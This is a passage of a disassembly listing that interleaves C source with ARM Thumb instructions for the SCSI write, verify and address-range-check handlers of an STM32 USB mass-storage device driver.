    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a73a:	68fb      	ldr	r3, [r7, #12]
 800a73c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a740:	68fa      	ldr	r2, [r7, #12]
 800a742:	33b0      	adds	r3, #176	; 0xb0
 800a744:	009b      	lsls	r3, r3, #2
 800a746:	4413      	add	r3, r2
 800a748:	685b      	ldr	r3, [r3, #4]
 800a74a:	689b      	ldr	r3, [r3, #8]
 800a74c:	7afa      	ldrb	r2, [r7, #11]
 800a74e:	4610      	mov	r0, r2
 800a750:	4798      	blx	r3
 800a752:	4603      	mov	r3, r0
 800a754:	2b00      	cmp	r3, #0
 800a756:	d008      	beq.n	800a76a <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a758:	7af9      	ldrb	r1, [r7, #11]
 800a75a:	233a      	movs	r3, #58	; 0x3a
 800a75c:	2202      	movs	r2, #2
 800a75e:	68f8      	ldr	r0, [r7, #12]
 800a760:	f7ff fd4a 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a764:	f04f 33ff 	mov.w	r3, #4294967295
 800a768:	e085      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a76a:	68fb      	ldr	r3, [r7, #12]
 800a76c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a770:	68fa      	ldr	r2, [r7, #12]
 800a772:	33b0      	adds	r3, #176	; 0xb0
 800a774:	009b      	lsls	r3, r3, #2
 800a776:	4413      	add	r3, r2
 800a778:	685b      	ldr	r3, [r3, #4]
 800a77a:	68db      	ldr	r3, [r3, #12]
 800a77c:	7afa      	ldrb	r2, [r7, #11]
 800a77e:	4610      	mov	r0, r2
 800a780:	4798      	blx	r3
 800a782:	4603      	mov	r3, r0
 800a784:	2b00      	cmp	r3, #0
 800a786:	d008      	beq.n	800a79a <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a788:	7af9      	ldrb	r1, [r7, #11]
 800a78a:	2327      	movs	r3, #39	; 0x27
 800a78c:	2202      	movs	r2, #2
 800a78e:	68f8      	ldr	r0, [r7, #12]
 800a790:	f7ff fd32 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a794:	f04f 33ff 	mov.w	r3, #4294967295
 800a798:	e06d      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a79a:	687b      	ldr	r3, [r7, #4]
 800a79c:	3302      	adds	r3, #2
 800a79e:	781b      	ldrb	r3, [r3, #0]
 800a7a0:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a7a2:	687b      	ldr	r3, [r7, #4]
 800a7a4:	3303      	adds	r3, #3
 800a7a6:	781b      	ldrb	r3, [r3, #0]
 800a7a8:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7aa:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a7ac:	687b      	ldr	r3, [r7, #4]
 800a7ae:	3304      	adds	r3, #4
 800a7b0:	781b      	ldrb	r3, [r3, #0]
 800a7b2:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a7b4:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a7b6:	687a      	ldr	r2, [r7, #4]
 800a7b8:	3205      	adds	r2, #5
 800a7ba:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a7bc:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a7be:	697a      	ldr	r2, [r7, #20]
 800a7c0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7c4:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7c6:	687b      	ldr	r3, [r7, #4]
 800a7c8:	3307      	adds	r3, #7
 800a7ca:	781b      	ldrb	r3, [r3, #0]
 800a7cc:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a7ce:	687a      	ldr	r2, [r7, #4]
 800a7d0:	3208      	adds	r2, #8
 800a7d2:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a7d4:	4313      	orrs	r3, r2
 800a7d6:	697a      	ldr	r2, [r7, #20]
 800a7d8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a7dc:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a7de:	697b      	ldr	r3, [r7, #20]
 800a7e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7e4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a7e6:	697b      	ldr	r3, [r7, #20]
 800a7e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7ec:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a7ee:	7af9      	ldrb	r1, [r7, #11]
 800a7f0:	68f8      	ldr	r0, [r7, #12]
 800a7f2:	f000 f97a 	bl	800aaea <SCSI_CheckAddressRange>
 800a7f6:	4603      	mov	r3, r0
 800a7f8:	2b00      	cmp	r3, #0
 800a7fa:	da02      	bge.n	800a802 <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a7fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a800:	e039      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a802:	697b      	ldr	r3, [r7, #20]
 800a804:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a808:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a80a:	697a      	ldr	r2, [r7, #20]
 800a80c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a810:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a814:	fb02 f303 	mul.w	r3, r2, r3
 800a818:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a81a:	697b      	ldr	r3, [r7, #20]
 800a81c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a820:	699b      	ldr	r3, [r3, #24]
 800a822:	693a      	ldr	r2, [r7, #16]
 800a824:	429a      	cmp	r2, r3
 800a826:	d00b      	beq.n	800a840 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a828:	697b      	ldr	r3, [r7, #20]
 800a82a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a82e:	7f59      	ldrb	r1, [r3, #29]
 800a830:	2320      	movs	r3, #32
 800a832:	2205      	movs	r2, #5
 800a834:	68f8      	ldr	r0, [r7, #12]
 800a836:	f7ff fcdf 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a83a:	f04f 33ff 	mov.w	r3, #4294967295
 800a83e:	e01a      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a840:	693b      	ldr	r3, [r7, #16]
 800a842:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a846:	bf28      	it	cs
 800a848:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a84c:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a84e:	697b      	ldr	r3, [r7, #20]
 800a850:	2201      	movs	r2, #1
 800a852:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a854:	4b0a      	ldr	r3, [pc, #40]	; (800a880 <SCSI_Write10+0x1c4>)
 800a856:	7819      	ldrb	r1, [r3, #0]
 800a858:	697b      	ldr	r3, [r7, #20]
 800a85a:	f103 0210 	add.w	r2, r3, #16
 800a85e:	693b      	ldr	r3, [r7, #16]
 800a860:	68f8      	ldr	r0, [r7, #12]
 800a862:	f002 faf3 	bl	800ce4c <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a866:	2300      	movs	r3, #0
 800a868:	e005      	b.n	800a876 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a86a:	7afb      	ldrb	r3, [r7, #11]
 800a86c:	4619      	mov	r1, r3
 800a86e:	68f8      	ldr	r0, [r7, #12]
 800a870:	f000 f9fe 	bl	800ac70 <SCSI_ProcessWrite>
 800a874:	4603      	mov	r3, r0
}
 800a876:	4618      	mov	r0, r3
 800a878:	3718      	adds	r7, #24
 800a87a:	46bd      	mov	sp, r7
 800a87c:	bd80      	pop	{r7, pc}
 800a87e:	bf00      	nop
 800a880:	2000010b 	.word	0x2000010b

0800a884 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a884:	b580      	push	{r7, lr}
 800a886:	b086      	sub	sp, #24
 800a888:	af00      	add	r7, sp, #0
 800a88a:	60f8      	str	r0, [r7, #12]
 800a88c:	460b      	mov	r3, r1
 800a88e:	607a      	str	r2, [r7, #4]
 800a890:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a892:	68fb      	ldr	r3, [r7, #12]
 800a894:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a898:	68fb      	ldr	r3, [r7, #12]
 800a89a:	32b0      	adds	r2, #176	; 0xb0
 800a89c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a8a0:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a8a2:	697b      	ldr	r3, [r7, #20]
 800a8a4:	2b00      	cmp	r3, #0
 800a8a6:	d102      	bne.n	800a8ae <SCSI_Write12+0x2a>
  {
    return -1;
 800a8a8:	f04f 33ff 	mov.w	r3, #4294967295
 800a8ac:	e0d7      	b.n	800aa5e <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a8ae:	697b      	ldr	r3, [r7, #20]
 800a8b0:	7a1b      	ldrb	r3, [r3, #8]
 800a8b2:	2b00      	cmp	r3, #0
 800a8b4:	f040 80cd 	bne.w	800aa52 <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a8b8:	697b      	ldr	r3, [r7, #20]
 800a8ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8be:	699b      	ldr	r3, [r3, #24]
 800a8c0:	2b00      	cmp	r3, #0
 800a8c2:	d10b      	bne.n	800a8dc <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8c4:	697b      	ldr	r3, [r7, #20]
 800a8c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ca:	7f59      	ldrb	r1, [r3, #29]
 800a8cc:	2320      	movs	r3, #32
 800a8ce:	2205      	movs	r2, #5
 800a8d0:	68f8      	ldr	r0, [r7, #12]
 800a8d2:	f7ff fc91 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a8d6:	f04f 33ff 	mov.w	r3, #4294967295
 800a8da:	e0c0      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a8dc:	697b      	ldr	r3, [r7, #20]
 800a8de:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8e2:	7f1b      	ldrb	r3, [r3, #28]
 800a8e4:	b25b      	sxtb	r3, r3
 800a8e6:	2b00      	cmp	r3, #0
 800a8e8:	da0b      	bge.n	800a902 <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8ea:	697b      	ldr	r3, [r7, #20]
 800a8ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8f0:	7f59      	ldrb	r1, [r3, #29]
 800a8f2:	2320      	movs	r3, #32
 800a8f4:	2205      	movs	r2, #5
 800a8f6:	68f8      	ldr	r0, [r7, #12]
 800a8f8:	f7ff fc7e 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a8fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a900:	e0ad      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a902:	68fb      	ldr	r3, [r7, #12]
 800a904:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a908:	68fa      	ldr	r2, [r7, #12]
 800a90a:	33b0      	adds	r3, #176	; 0xb0
 800a90c:	009b      	lsls	r3, r3, #2
 800a90e:	4413      	add	r3, r2
 800a910:	685b      	ldr	r3, [r3, #4]
 800a912:	689b      	ldr	r3, [r3, #8]
 800a914:	7afa      	ldrb	r2, [r7, #11]
 800a916:	4610      	mov	r0, r2
 800a918:	4798      	blx	r3
 800a91a:	4603      	mov	r3, r0
 800a91c:	2b00      	cmp	r3, #0
 800a91e:	d00b      	beq.n	800a938 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a920:	7af9      	ldrb	r1, [r7, #11]
 800a922:	233a      	movs	r3, #58	; 0x3a
 800a924:	2202      	movs	r2, #2
 800a926:	68f8      	ldr	r0, [r7, #12]
 800a928:	f7ff fc66 	bl	800a1f8 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a92c:	697b      	ldr	r3, [r7, #20]
 800a92e:	2205      	movs	r2, #5
 800a930:	721a      	strb	r2, [r3, #8]
      return -1;
 800a932:	f04f 33ff 	mov.w	r3, #4294967295
 800a936:	e092      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a938:	68fb      	ldr	r3, [r7, #12]
 800a93a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a93e:	68fa      	ldr	r2, [r7, #12]
 800a940:	33b0      	adds	r3, #176	; 0xb0
 800a942:	009b      	lsls	r3, r3, #2
 800a944:	4413      	add	r3, r2
 800a946:	685b      	ldr	r3, [r3, #4]
 800a948:	68db      	ldr	r3, [r3, #12]
 800a94a:	7afa      	ldrb	r2, [r7, #11]
 800a94c:	4610      	mov	r0, r2
 800a94e:	4798      	blx	r3
 800a950:	4603      	mov	r3, r0
 800a952:	2b00      	cmp	r3, #0
 800a954:	d00b      	beq.n	800a96e <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a956:	7af9      	ldrb	r1, [r7, #11]
 800a958:	2327      	movs	r3, #39	; 0x27
 800a95a:	2202      	movs	r2, #2
 800a95c:	68f8      	ldr	r0, [r7, #12]
 800a95e:	f7ff fc4b 	bl	800a1f8 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a962:	697b      	ldr	r3, [r7, #20]
 800a964:	2205      	movs	r2, #5
 800a966:	721a      	strb	r2, [r3, #8]
      return -1;
 800a968:	f04f 33ff 	mov.w	r3, #4294967295
 800a96c:	e077      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a96e:	687b      	ldr	r3, [r7, #4]
 800a970:	3302      	adds	r3, #2
 800a972:	781b      	ldrb	r3, [r3, #0]
 800a974:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a976:	687b      	ldr	r3, [r7, #4]
 800a978:	3303      	adds	r3, #3
 800a97a:	781b      	ldrb	r3, [r3, #0]
 800a97c:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a97e:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a980:	687b      	ldr	r3, [r7, #4]
 800a982:	3304      	adds	r3, #4
 800a984:	781b      	ldrb	r3, [r3, #0]
 800a986:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a988:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a98a:	687a      	ldr	r2, [r7, #4]
 800a98c:	3205      	adds	r2, #5
 800a98e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a990:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a992:	697a      	ldr	r2, [r7, #20]
 800a994:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a998:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a99a:	687b      	ldr	r3, [r7, #4]
 800a99c:	3306      	adds	r3, #6
 800a99e:	781b      	ldrb	r3, [r3, #0]
 800a9a0:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a9a2:	687b      	ldr	r3, [r7, #4]
 800a9a4:	3307      	adds	r3, #7
 800a9a6:	781b      	ldrb	r3, [r3, #0]
 800a9a8:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9aa:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a9ac:	687b      	ldr	r3, [r7, #4]
 800a9ae:	3308      	adds	r3, #8
 800a9b0:	781b      	ldrb	r3, [r3, #0]
 800a9b2:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a9b4:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a9b6:	687a      	ldr	r2, [r7, #4]
 800a9b8:	3209      	adds	r2, #9
 800a9ba:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a9bc:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a9be:	697a      	ldr	r2, [r7, #20]
 800a9c0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9c4:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a9c6:	697b      	ldr	r3, [r7, #20]
 800a9c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9cc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a9ce:	697b      	ldr	r3, [r7, #20]
 800a9d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9d4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9d6:	7af9      	ldrb	r1, [r7, #11]
 800a9d8:	68f8      	ldr	r0, [r7, #12]
 800a9da:	f000 f886 	bl	800aaea <SCSI_CheckAddressRange>
 800a9de:	4603      	mov	r3, r0
 800a9e0:	2b00      	cmp	r3, #0
 800a9e2:	da02      	bge.n	800a9ea <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a9e4:	f04f 33ff 	mov.w	r3, #4294967295
 800a9e8:	e039      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a9ea:	697b      	ldr	r3, [r7, #20]
 800a9ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a9f0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a9f2:	697a      	ldr	r2, [r7, #20]
 800a9f4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a9f8:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a9fc:	fb02 f303 	mul.w	r3, r2, r3
 800aa00:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa02:	697b      	ldr	r3, [r7, #20]
 800aa04:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa08:	699b      	ldr	r3, [r3, #24]
 800aa0a:	693a      	ldr	r2, [r7, #16]
 800aa0c:	429a      	cmp	r2, r3
 800aa0e:	d00b      	beq.n	800aa28 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa10:	697b      	ldr	r3, [r7, #20]
 800aa12:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa16:	7f59      	ldrb	r1, [r3, #29]
 800aa18:	2320      	movs	r3, #32
 800aa1a:	2205      	movs	r2, #5
 800aa1c:	68f8      	ldr	r0, [r7, #12]
 800aa1e:	f7ff fbeb 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800aa22:	f04f 33ff 	mov.w	r3, #4294967295
 800aa26:	e01a      	b.n	800aa5e <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aa28:	693b      	ldr	r3, [r7, #16]
 800aa2a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aa2e:	bf28      	it	cs
 800aa30:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aa34:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aa36:	697b      	ldr	r3, [r7, #20]
 800aa38:	2201      	movs	r2, #1
 800aa3a:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aa3c:	4b0a      	ldr	r3, [pc, #40]	; (800aa68 <SCSI_Write12+0x1e4>)
 800aa3e:	7819      	ldrb	r1, [r3, #0]
 800aa40:	697b      	ldr	r3, [r7, #20]
 800aa42:	f103 0210 	add.w	r2, r3, #16
 800aa46:	693b      	ldr	r3, [r7, #16]
 800aa48:	68f8      	ldr	r0, [r7, #12]
 800aa4a:	f002 f9ff 	bl	800ce4c <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aa4e:	2300      	movs	r3, #0
 800aa50:	e005      	b.n	800aa5e <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aa52:	7afb      	ldrb	r3, [r7, #11]
 800aa54:	4619      	mov	r1, r3
 800aa56:	68f8      	ldr	r0, [r7, #12]
 800aa58:	f000 f90a 	bl	800ac70 <SCSI_ProcessWrite>
 800aa5c:	4603      	mov	r3, r0
}
 800aa5e:	4618      	mov	r0, r3
 800aa60:	3718      	adds	r7, #24
 800aa62:	46bd      	mov	sp, r7
 800aa64:	bd80      	pop	{r7, pc}
 800aa66:	bf00      	nop
 800aa68:	2000010b 	.word	0x2000010b

0800aa6c <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aa6c:	b580      	push	{r7, lr}
 800aa6e:	b086      	sub	sp, #24
 800aa70:	af00      	add	r7, sp, #0
 800aa72:	60f8      	str	r0, [r7, #12]
 800aa74:	460b      	mov	r3, r1
 800aa76:	607a      	str	r2, [r7, #4]
 800aa78:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aa7a:	68fb      	ldr	r3, [r7, #12]
 800aa7c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aa80:	68fb      	ldr	r3, [r7, #12]
 800aa82:	32b0      	adds	r2, #176	; 0xb0
 800aa84:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aa88:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800aa8a:	697b      	ldr	r3, [r7, #20]
 800aa8c:	2b00      	cmp	r3, #0
 800aa8e:	d102      	bne.n	800aa96 <SCSI_Verify10+0x2a>
  {
    return -1;
 800aa90:	f04f 33ff 	mov.w	r3, #4294967295
 800aa94:	e025      	b.n	800aae2 <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800aa96:	687b      	ldr	r3, [r7, #4]
 800aa98:	3301      	adds	r3, #1
 800aa9a:	781b      	ldrb	r3, [r3, #0]
 800aa9c:	f003 0302 	and.w	r3, r3, #2
 800aaa0:	2b00      	cmp	r3, #0
 800aaa2:	d008      	beq.n	800aab6 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aaa4:	7af9      	ldrb	r1, [r7, #11]
 800aaa6:	2324      	movs	r3, #36	; 0x24
 800aaa8:	2205      	movs	r2, #5
 800aaaa:	68f8      	ldr	r0, [r7, #12]
 800aaac:	f7ff fba4 	bl	800a1f8 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800aab0:	f04f 33ff 	mov.w	r3, #4294967295
 800aab4:	e015      	b.n	800aae2 <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800aab6:	697b      	ldr	r3, [r7, #20]
 800aab8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aabc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aabe:	697b      	ldr	r3, [r7, #20]
 800aac0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aac4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aac6:	7af9      	ldrb	r1, [r7, #11]
 800aac8:	68f8      	ldr	r0, [r7, #12]
 800aaca:	f000 f80e 	bl	800aaea <SCSI_CheckAddressRange>
 800aace:	4603      	mov	r3, r0
 800aad0:	2b00      	cmp	r3, #0
 800aad2:	da02      	bge.n	800aada <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800aad4:	f04f 33ff 	mov.w	r3, #4294967295
 800aad8:	e003      	b.n	800aae2 <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800aada:	697b      	ldr	r3, [r7, #20]
 800aadc:	2200      	movs	r2, #0
 800aade:	60da      	str	r2, [r3, #12]

  return 0;
 800aae0:	2300      	movs	r3, #0
}
 800aae2:	4618      	mov	r0, r3
 800aae4:	3718      	adds	r7, #24
 800aae6:	46bd      	mov	sp, r7
 800aae8:	bd80      	pop	{r7, pc}

0800aaea <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800aaea:	b580      	push	{r7, lr}
 800aaec:	b086      	sub	sp, #24
 800aaee:	af00      	add	r7, sp, #0
 800aaf0:	60f8      	str	r0, [r7, #12]
 800aaf2:	607a      	str	r2, [r7, #4]
 800aaf4:	603b      	str	r3, [r7, #0]
 800aaf6:	460b      	mov	r3, r1
 800aaf8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800aafa:	68fb      	ldr	r3, [r7, #12]
 800aafc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab00:	68fb      	ldr	r3, [r7, #12]
 800ab02:	32b0      	adds	r2, #176	; 0xb0
 800ab04:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab08:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab0a:	697b      	ldr	r3, [r7, #20]
 800ab0c:	2b00      	cmp	r3, #0
 800ab0e:	d102      	bne.n	800ab16 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab10:	f04f 33ff 	mov.w	r3, #4294967295
 800ab14:	e012      	b.n	800ab3c <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ab16:	687a      	ldr	r2, [r7, #4]
 800ab18:	683b      	ldr	r3, [r7, #0]
 800ab1a:	441a      	add	r2, r3
 800ab1c:	697b      	ldr	r3, [r7, #20]
 800ab1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab22:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ab24:	429a      	cmp	r2, r3
 800ab26:	d908      	bls.n	800ab3a <SCSI_CheckAddressRange+0x50>
  {
